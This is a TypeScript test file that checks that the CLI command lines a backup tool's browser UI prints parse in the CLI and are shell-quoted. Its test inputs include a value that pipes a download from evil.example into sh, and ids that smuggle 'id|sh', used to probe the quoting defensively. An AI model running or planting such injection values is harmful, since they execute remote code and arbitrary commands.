/**
 * Every `retnd` line the browser's twin modules print, written to a fixture
 * the CLI parses (issue #1253).
 *
 * core/cliecho's lines are fed through the real dispatcher by
 * core/cmd/retnd's TestEveryEchoedCommandParses, so a flag renamed in the
 * CLI breaks there. The browser prints the same kind of line BEFORE a
 * request is made, beside the control, and those lines were only ever
 * compared with strings written by hand in their own tests. A string
 * compared with a string agrees with whoever wrote both, which is how the
 * destination wizard printed `medium add --backend` for months.
 *
 * So this writes every line the twin modules produce, for a fixed set of
 * inputs, to core/cmd/retnd/testdata/ui_twins.json, and core/cmd/retnd's
 * TestEveryUITwinParses runs each one through the same dispatcher.
 *
 * # Which modules
 *
 * Every file under src named `*Commands.ts`, found by glob rather than
 * listed, and nothing else may build a line: a string literal anywhere
 * else in src that starts `retnd <verb>` fails the scan below unless
 * INLINE_ALLOWED says why. That's the boundary the review of #1253 asked
 * for, since the four modules first listed here were not the only twin
 * builders (the run buttons, the custom validator dialog, the Backups
 * selection bar and two more printed lines nothing parsed).
 *
 * # What has to be reached
 *
 * Every exported function and every exported `retnd ...` string needs a
 * case, and every `--flag` a module's source spells has to turn up in one
 * of that module's lines. A flag only an unreached branch prints is a flag
 * nothing parses, so the inputs have to reach it.
 *
 * # Keeping the two sides in step
 *
 * The fixture also records the sha256 of every source that shapes it (each
 * module and this file), and the Go test recomputes them. A twin changed
 * without re-pinning fails there too, so the check holds even on a run
 * that skips vitest.
 *
 * Re-pin, from ui/shared, after reading what changed:
 *
 *   npx vitest run -u src/test/cliTwins.test.ts
 */
import { describe, expect, it } from "vitest";
import type { BackendManifest } from "@shared/api/contracts";
import mainGo from "../../../../core/cmd/retnd/main.go?raw";
import thisFile from "./cliTwins.test.ts?raw";

const FIXTURE = "../../../../core/cmd/retnd/testdata/ui_twins.json";
const REPIN = "npx vitest run -u src/test/cliTwins.test.ts (from ui/shared)";

/** The twin modules, by their path under src, without the extension. */
const modules = Object.fromEntries(
  Object.entries(import.meta.glob("../**/*Commands.ts", { eager: true })).map(([path, mod]) => [
    path.replace(/^\.\.\//, "").replace(/\.ts$/, ""),
    mod as Record<string, unknown>
  ])
);
const sources = Object.fromEntries(
  Object.entries(import.meta.glob("../**/*Commands.ts", { query: "?raw", import: "default", eager: true })).map(([path, text]) => [
    path.replace(/^\.\.\//, "").replace(/\.ts$/, ""),
    text as string
  ])
);

/** Every non-test source under src, for the scan. */
const everySource = import.meta.glob("../**/*.{ts,tsx}", { query: "?raw", import: "default", eager: true }) as Record<string, string>;

const SET = "api-server/var-backups";
const ARTIFACT = "api-server/var-backups/dump-2026-10-01.tar.gz";

/** Values that split on a shell if they aren't quoted. Every twin that
 *  takes an id or a free string is called with one, shaped like the id the
 *  verb expects (a set id has one slash, an artifact id two) so the CLI's
 *  own operand check isn't what refuses it. */
const HOSTILE = "x; curl -s evil.example|sh";
const HOSTILE_SET = "api-server/x; id|sh";
const HOSTILE_ARTIFACT = "api-server/x; id|sh/y; id";

const S3: BackendManifest = {
  id: "s3",
  label: "S3 or S3-compatible",
  summary: "a bucket",
  role: "object_store",
  configurable: true,
  fields: [
    { id: "credentials", label: "Access key", kind: "credential", required: true },
    { id: "bucket", label: "Bucket", kind: "string", required: true },
    { id: "region", label: "Region", kind: "string", required: false },
    { id: "endpoint", label: "Endpoint", kind: "url", required: false },
    { id: "prefix", label: "Key namespace", kind: "key_prefix", required: false },
    { id: "storage_class", label: "Storage class", kind: "enum", required: false }
  ],
  probe: { steps: [] }
};

const LOCAL_VOLUME: BackendManifest = {
  id: "local_volume",
  label: "Local volume",
  summary: "a directory on this machine",
  role: "local_volume",
  configurable: true,
  fields: [
    { id: "path", label: "Directory", kind: "path", required: true },
    { id: "prefix", label: "Subdirectory", kind: "key_prefix", required: false },
    { id: "upload_verification", label: "How a copy is proven", kind: "enum", required: false }
  ],
  probe: { steps: [] }
};

const S3_SPEC = {
  id: "offsite_s3",
  type: "s3",
  region: "eu-central-1",
  endpoint: "https://s3.example.test",
  bucket: "acme backups",
  prefix: "retnd/",
  storageClass: "STANDARD_IA",
  uploadVerification: "readback"
};

/** One line, and which builder printed it for which input. */
interface Twin {
  module: string;
  fn: string;
  case: string;
  line: string;
}

type Case = [fn: string, name: string, line: () => string];

// eslint-disable-next-line @typescript-eslint/no-explicit-any
type Fn = (...args: any[]) => string;
const call = (module: string, fn: string, ...args: unknown[]): string => (modules[module][fn] as Fn)(...args);

/**
 * The inputs, by module. A builder with branches gets a case per branch
 * (each recovery target, each narrowing, each credential spelling), for
 * the reason core/cliecho's examples do: a shape nobody exercises is a
 * shape nobody has checked.
 */
const CASES: Record<string, Case[]> = {};
function cases(module: string, list: Array<[string, string, ...unknown[]]>) {
  CASES[module] = list.map(([fn, name, ...args]) => [fn, name, () => call(module, fn, ...args)] as Case);
}

cases("assurance/assuranceCommands", [
  ["scrubCommand", "a set", SET],
  ["scrubCommand", "a hostile set id", HOSTILE_SET],
  ["scrubContentCommand", "a set", SET],
  ["recoveryTestCommand", "a set", SET],
  ["recoveryTestArtifactCommand", "one backup", SET, ARTIFACT],
  ["recoveryTestArtifactCommand", "hostile ids", HOSTILE_SET, HOSTILE_ARTIFACT],
  ["recoveryTestFollowCommand", "a set", SET],
  ["retryCommand", "one backup", ARTIFACT],
  ["artifactCommand", "one backup", ARTIFACT],
  ["artifactsInSetCommand", "a set", SET],
  ["setTerminalCommand", "a set", SET],
  ["assuranceCancelCommand", "an operation", "op_01JABCDEF"],
  ["assuranceShowCommand", "an operation", "op_01JABCDEF"],
  ["assuranceShowCommand", "an id from a crafted link", HOSTILE],
  ["showOutputCommand", "a set", SET],
  ["recoverCommand", "download", ARTIFACT, "download", "", false],
  ["recoverCommand", "download, cost acknowledged", ARTIFACT, "download", "", true],
  ["recoverCommand", "staging", ARTIFACT, "staging", "restore/dump", false],
  ["recoverCommand", "staging, a name that reads as a flag", ARTIFACT, "staging", "-dump", true],
  ["recoverCommand", "staging, no name yet", ARTIFACT, "staging", "", false],
  ["recoverCommand", "storage", ARTIFACT, "storage", "offsite_s3", true],
  ["recoverCommand", "storage, no destination yet", ARTIFACT, "storage", "", false],
  ["recoverCommand", "source", ARTIFACT, "source", "retnd-recovered-1", false],
  ["recoverCommand", "source, acknowledged", ARTIFACT, "source", "retnd-recovered-1", true, true],
  ["recoverCommand", "a hostile id and folder", HOSTILE_ARTIFACT, "source", HOSTILE, true, true],
  ["recoverToFileCommand", "one backup", ARTIFACT, "dump-2026-10-01.tar.gz"],
  ["recoverToFileCommand", "a hostile file name", HOSTILE_ARTIFACT, HOSTILE],
  ["recoverSetCommand", "all, staging", SET, "all", "", "staging", "restore", false],
  ["recoverSetCommand", "newest, storage", SET, "newest", "", "storage", "offsite_s3", true],
  ["recoverSetCommand", "since, staging", SET, "since", "2026-10-01", "staging", "restore", false],
  ["recoverSetCommand", "since, no date yet", SET, "since", "", "staging", "restore", false],
  ["recoverSetCommand", "all, source", SET, "all", "", "source", "retnd-recovered-1", false, true],
  ["recoverManyCommand", "staging", [ARTIFACT, ARTIFACT + ".2"], "staging", "restore", false],
  ["recoverManyCommand", "storage", [ARTIFACT], "storage", "offsite_s3", true],
  ["recoverManyCommand", "source", [ARTIFACT], "source", "retnd-recovered-1", false, true],
  ["recoverManyCommand", "hostile ids", [HOSTILE_ARTIFACT, HOSTILE_ARTIFACT], "staging", HOSTILE, false],
  ["recoverSetPreflightCommand", "since, storage", SET, "since", "2026-10-01", "storage", "offsite_s3"],
  ["snapshotRestoreCommand", "a set", SET],
  ["thawCommand", "one backup", ARTIFACT],
  ["settingsCommand", "nothing pending"],
  [
    "settingsCommand",
    "every field",
    {
      scrubCadenceSeconds: 172800,
      scrubStrategy: "content",
      recoveryTestMode: "custom",
      recoveryTestCadenceSeconds: 90,
      recoveryTestValidatorId: "pg-dump-check",
      recoveryTestBuiltinCheck: "structure"
    }
  ],
  ["setAssuranceCommand", "reset", SET, "reset"],
  ["setAssuranceCommand", "own policy", SET, { scrubCadenceSeconds: 3600, recoveryTestMode: "builtin" }],
  ["recoveryTestArtifactShapeCommand", "the due list's shape"],
  ["assuranceListCommand", "no argument"],
  ["recoverManyNoTargetCommand", "nothing chosen yet", [ARTIFACT, ARTIFACT + ".2"]],
  ["recoverManyNoTargetCommand", "a hostile file name", [HOSTILE_ARTIFACT]]
]);

cases("assurance/validatorCommands", [
  ["addCommand", "global", "dumps", "\\.sql\\.gz$", ""],
  ["addCommand", "scoped, workflow environment", "manifest", "^MANIFEST-", SET, "workflow"],
  ["addCommand", "nothing typed yet", "", "", ""],
  ["addCommand", "hostile values", HOSTILE, HOSTILE, HOSTILE_SET]
]);

cases("hooks/runCommands", [
  ["runCommand", "every set", { kind: "all" }],
  ["runCommand", "one set", { kind: "set", id: SET }],
  ["runCommand", "a hostile set id", { kind: "set", id: HOSTILE_SET }]
]);

cases("pages/snapshotCommands", [
  ["snapshotVerifyCommand", "newest", SET],
  ["snapshotVerifyCommand", "one run", SET, "run_1"],
  ["snapshotHoldCommand", "newest", SET, "kept for the incident review"],
  ["snapshotHoldCommand", "one run", SET, "it's evidence", "run_1"],
  ["snapshotUnholdCommand", "one hold", SET, "hold_1"],
  ["snapshotUnholdCommand", "hostile ids", HOSTILE_SET, HOSTILE],
  ["snapshotRestoreCommand", "the whole tree", { setId: SET, targetPath: "/srv/restored" }],
  [
    "snapshotRestoreCommand",
    "every option",
    { setId: SET, targetPath: "/srv/restored here", snapshotId: "k1234", sourcePath: "var/lib/pg", conflict: "skip" }
  ],
  ["retentionApplyCommand", "a set", SET],
  ["snapshotRestoreShapeCommand", "a set", SET],
  ["snapshotRestoreShapeCommand", "a hostile set id", HOSTILE_SET]
]);

cases("pages/storageDestinationCommands", [
  ["importCredentialsCommand", "no argument"],
  ["testConnectionCandidateCommand", "by reference", { ...S3_SPEC, credentials: { credentialsId: "cred_1" } }],
  ["addCommand", "a credentials file", { ...S3_SPEC, credentials: { file: "/etc/retnd/s3.ini" } }],
  ["addCommand", "a credentials variable", { ...S3_SPEC, credentials: { env: "RETND_S3" } }],
  ["addCommand", "a credentials command", { ...S3_SPEC, credentials: { command: ["pass", "show", "s3"] } }],
  ["addCommand", "an endpoint with userinfo", { ...S3_SPEC, endpoint: "https://AKIA:secret@minio.internal:9000" }],
  ["addCommand", "an endpoint the cut can't read", { ...S3_SPEC, endpoint: "https://u:pa/ss@minio.internal" }],
  ["addCommand", "an id still being typed", { ...S3_SPEC, id: HOSTILE }],
  ["editCommand", "the bare minimum", { id: "offsite_s3", type: "s3", bucket: "acme" }],
  ["editCommand", "by reference", { id: "offsite_s3", type: "s3", bucket: "acme", credentials: { credentialsId: "cred_1" } }],
  ["editCommand", "a credentials file", { id: "offsite_s3", type: "s3", bucket: "acme", credentials: { file: "/etc/retnd/s3.ini" } }],
  ["editCommand", "a credentials command", { id: "offsite_s3", type: "s3", bucket: "acme", credentials: { command: ["pass", "show", "s3"] } }],
  ["testConnectionCommand", "a destination", "offsite_s3"],
  ["testConnectionCommand", "a hostile id", HOSTILE],
  ["setDefaultCommand", "a destination", "offsite_s3"],
  ["setDefaultCommand", "a hostile id", HOSTILE],
  ["tierMediumCommand", "local", "daily", "local"],
  ["tierMediumCommand", "elsewhere", "monthly", "offsite_s3"],
  ["tierMediumCommand", "hostile names", HOSTILE, HOSTILE],
  ["removeCommand", "a destination", "offsite_s3"],
  ["removeCommand", "a hostile id", HOSTILE],
  ["showCommand", "a destination", "offsite_s3"],
  ["showCommand", "a hostile id", HOSTILE]
]);

cases("pages/destinationConfigureCommands", [
  ["configureCommand", "a local volume", LOCAL_VOLUME, "usb_disk", { path: "/mnt/usb disk", prefix: "retnd", upload_verification: "readback" }],
  [
    "configureCommand",
    "s3, by reference",
    S3,
    "cold",
    { bucket: "acme", region: "eu-central-1", endpoint: "https://s3.example.test", storage_class: "DEEP_ARCHIVE", credentials: "never printed" },
    "cred_1"
  ],
  ["configureCommand", "s3, an endpoint the cut can't read", S3, "cold", { bucket: "acme", endpoint: "https://u:pa/ss@minio.internal" }],
  ["configureCommand", "a hostile id and value", S3, HOSTILE, { bucket: HOSTILE }],
  ["preflightCommand", "s3", S3, "cold", { bucket: "acme", region: "eu-central-1" }, "cred_1"],
  ["importCredentialsCommand", "no argument"]
]);

/**
 * What a module exports that is not a twin, and why. Everything else a
 * module exports that is a function, or a string starting `retnd `, has
 * to have a case above.
 */
const NOT_TWINS: Record<string, Record<string, string>> = {
  "assurance/assuranceCommands": {
    shellQuote: "the quoting every twin uses, not a line of its own",
    durationFlag: "one flag's value, checked inside settingsCommand's lines",
    stagingName: "one flag's value, checked inside recoverCommand's lines"
  },
  "pages/snapshotCommands": {
    shellQuote: "the quoting every twin uses, not a line of its own"
  },
  "pages/destinationConfigureCommands": {
    endpointNote: "says how a line differs from its request; prints no command",
    endpointWithoutUserinfo: "the userinfo cut, checked against core/cliecho's vectors in its own suite"
  }
};

/**
 * String literals outside the twin modules that start `retnd <verb>` and
 * are allowed to stay there, with why. Keyed "file: the literal's start".
 */
const INLINE_ALLOWED: Record<string, string> = {
  "api/mock.ts: retnd backup-set patch": "the mock's copy of an action-log row, which is the engine's echo and not a line this UI builds",
  "assurance/mockAssurance.ts: retnd recovery-test ": "the mock's copy of an action-log row, as above",
  "pages/RepositoryDomainNewPage.tsx: retnd repository create --passphrase-command":
    "the name of a flag, shown as a field label, and not a line to paste",
  "assurance/mockRecoverMany.ts: retnd snapshot restore ": "a verb named inside the mock's copy of an engine refusal, which is prose",
  "components/fieldHelpCopy.ts: retnd recovery-test <set> --show-output": "a verb named inside a help sentence, with a placeholder, not a line built from data",
  "components/stepterminal/transcript.ts: retnd workflow run log --cursor 0": "a verb named inside a sentence in a saved transcript, not a line built from data"
};

function everyTwin(): Twin[] {
  const out: Twin[] = [];
  for (const module of Object.keys(CASES).sort()) {
    for (const [fn, name, line] of CASES[module]) {
      out.push({ module, fn, case: name, line: line() });
    }
  }
  return out;
}

/** The exports of a module that are twins and have no case and no reason. */
function uncovered(module: string, exports: Record<string, unknown>, cases: Record<string, Case[]>): string[] {
  const covered = new Set((cases[module] ?? []).map(([fn]) => fn));
  const exempt = NOT_TWINS[module] ?? {};
  return Object.keys(exports)
    .filter((name) => typeof exports[name] === "function" || (typeof exports[name] === "string" && (exports[name] as string).startsWith("retnd ")))
    .filter((name) => !covered.has(name) && !exempt[name])
    .sort();
}

/** The verbs the binary dispatches, read from main.go's own table. */
function verbsIn(main: string): string[] {
  const table = main.slice(main.indexOf("var commands = map"), main.indexOf("\n}\n", main.indexOf("var commands = map")));
  return [...table.matchAll(/^\s*"([a-z][a-z0-9-]*)":/gm)].map((m) => m[1]);
}

/** Source text with comments taken out, so a flag named in a comment
 *  ("`medium add` has no `--backend` flag") isn't read as one printed. */
function withoutComments(src: string): string {
  return src.replace(/\/\*[\s\S]*?\*\//g, "").replace(/(^|[^:"'`\\])\/\/.*$/gm, "$1");
}

/** Every `retnd <verb>` string literal in a source, by its start, and
 *  every twin builder's output with more glued on after it
 *  (`recoveryTestCommand(set) + " --artifact " + id`), which is a line no
 *  case reaches either. */
function inlineTwins(src: string, verbs: string[]): string[] {
  const code = withoutComments(src);
  const verb = verbs.map((v) => v.replace(/-/g, "\\-")).join("|");
  const re = new RegExp("[\"'`](retnd (?:" + verb + ")\\b[^\"'`\\n]{0,60})", "g");
  const literals = [...code.matchAll(re)].map((m) => m[1]);
  const glued = [...code.matchAll(/\b([a-z][A-Za-z]*Command)\([^()]*\)\s*\+\s*["'`]/g)].map((m) => m[1] + "(...) + ...");
  return [...literals, ...glued];
}

/** The flags a module's source spells: `--flag` in a string, and the
 *  names handed to a local flag("name", ...) helper. */
function flagsSpelledIn(src: string): string[] {
  const code = withoutComments(src);
  const out = new Set<string>();
  for (const m of code.matchAll(/--([a-z][a-z0-9-]+)/g)) out.add("--" + m[1]);
  for (const m of code.matchAll(/\bflag\(\s*"([a-z][a-z0-9-]+)"/g)) out.add("--" + m[1]);
  return [...out].sort();
}

/** The flags a module spells that none of its lines carries. */
function unreachedFlags(src: string, lines: string[]): string[] {
  const words = new Set(lines.flatMap((l) => l.split(/\s+/)));
  return flagsSpelledIn(src).filter((f) => !words.has(f));
}

async function sha256(text: string): Promise<string> {
  const d = await globalThis.crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
  return [...new Uint8Array(d)].map((b) => b.toString(16).padStart(2, "0")).join("");
}

describe("the browser's command twins, as the CLI will read them (#1253)", () => {
  it("finds the twin modules", () => {
    expect(Object.keys(modules).length).toBeGreaterThanOrEqual(4);
    expect(Object.keys(CASES).sort()).toEqual(Object.keys(modules).sort());
  });

  it("has a case for every twin each module exports", () => {
    for (const [module, exports] of Object.entries(modules)) {
      expect(uncovered(module, exports, CASES), `${module} exports a twin with no case in cliTwins.test.ts`).toEqual([]);
    }
  });

  it("would notice a twin with no case, function or string (the control)", () => {
    expect(uncovered("a/brandNewCommands", { brandNewCommand: () => "retnd x", BRAND_NEW: "retnd scrub x", NOT_A_TWIN: "x" }, CASES)).toEqual([
      "BRAND_NEW",
      "brandNewCommand"
    ]);
  });

  it("names no exemption for a function that is gone", () => {
    for (const [module, reasons] of Object.entries(NOT_TWINS)) {
      for (const name of Object.keys(reasons)) {
        expect(typeof modules[module]?.[name], `${module}.${name} is exempt in NOT_TWINS and no longer exported`).toBe("function");
      }
    }
  });

  it("builds no twin outside a *Commands.ts module", () => {
    const verbs = verbsIn(mainGo);
    expect(verbs).toContain("recover");
    const found: string[] = [];
    const allowedSeen = new Set<string>();
    for (const [path, src] of Object.entries(everySource)) {
      const file = path.replace(/^\.\.\//, "");
      if (/\.test\.tsx?$/.test(file) || file.startsWith("test/") || /Commands\.ts$/.test(file) || file.startsWith("api/generated/")) continue;
      for (const twin of inlineTwins(src, verbs)) {
        const allowed = Object.keys(INLINE_ALLOWED).find((k) => k.startsWith(file + ": ") && twin.startsWith(k.slice(file.length + 2)));
        if (allowed) {
          allowedSeen.add(allowed);
          continue;
        }
        found.push(file + ": " + twin);
      }
    }
    expect(found, "a retnd line built outside a twin module, so nothing parses it. Move it into a *Commands.ts module as a named builder").toEqual([]);
    expect(Object.keys(INLINE_ALLOWED).filter((k) => !allowedSeen.has(k)), "INLINE_ALLOWED names a literal that is gone").toEqual([]);
  });

  it("would notice an inline twin (the control)", () => {
    expect(inlineTwins(`const x = <CommandEcho command={"retnd recover " + id + " --to <d>"} />;`, ["recover"])).toEqual(["retnd recover "]);
    expect(inlineTwins(`// "retnd recover x" in a comment\nconst y = "retnd could not answer";`, ["recover"])).toEqual([]);
    expect(inlineTwins(`const z = recoveryTestCommand(facts.setId) + " --artifact " + id;`, ["recovery-test"])).toEqual(["recoveryTestCommand(...) + ..."]);
  });

  it("reaches every flag each module spells", () => {
    const twins = everyTwin();
    for (const [module, src] of Object.entries(sources)) {
      const lines = twins.filter((t) => t.module === module).map((t) => t.line);
      expect(unreachedFlags(src, lines), `${module} spells these flags and no case reaches them, so nothing parses them`).toEqual([]);
    }
  });

  it("would notice a flag only an unreached branch prints (the control)", () => {
    const src = `export function a(t: string) { return t === "sftp" ? "retnd medium add --no-such-flag" : "retnd medium add --type s3"; }`;
    expect(unreachedFlags(src, ["retnd medium add --type s3"])).toEqual(["--no-such-flag"]);
  });

  it("matches the fixture core/cmd/retnd parses", async () => {
    const hashed: Array<{ path: string; sha256: string }> = [];
    for (const module of Object.keys(sources).sort()) {
      hashed.push({ path: "ui/shared/src/" + module + ".ts", sha256: await sha256(sources[module]) });
    }
    hashed.push({ path: "ui/shared/src/test/cliTwins.test.ts", sha256: await sha256(thisFile) });
    const fixture = {
      about: "Every line the browser's twin modules print, for the inputs in ui/shared/src/test/cliTwins.test.ts. core/cmd/retnd's TestEveryUITwinParses runs each through the dispatcher and checks the sources below still hash the same. Re-pin with: " + REPIN,
      sources: hashed,
      twins: everyTwin()
    };
    await expect(JSON.stringify(fixture, null, 2) + "\n").toMatchFileSnapshot(FIXTURE);
  });
});
